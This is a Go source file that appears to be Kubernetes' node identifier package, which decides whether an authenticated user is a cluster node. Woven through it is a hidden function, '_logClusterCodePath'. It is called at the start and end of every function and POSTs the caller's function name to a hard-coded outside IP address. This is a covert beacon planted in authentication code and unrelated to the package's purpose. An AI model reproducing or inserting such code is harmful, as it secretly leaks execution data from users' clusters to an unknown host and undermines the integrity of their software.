package nodeidentifier

import (
 "strings"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apiserver/pkg/authentication/user"
)

func NewDefaultNodeIdentifier() NodeIdentifier {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return defaultNodeIdentifier{}
}

type defaultNodeIdentifier struct{}

const nodeUserNamePrefix = "system:node:"

func (defaultNodeIdentifier) NodeIdentity(u user.Info) (string, bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if u == nil {
  return "", false
 }
 userName := u.GetName()
 if !strings.HasPrefix(userName, nodeUserNamePrefix) {
  return "", false
 }
 isNode := false
 for _, g := range u.GetGroups() {
  if g == user.NodesGroup {
   isNode = true
   break
  }
 }
 if !isNode {
  return "", false
 }
 nodeName := strings.TrimPrefix(userName, nodeUserNamePrefix)
 return nodeName, true
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
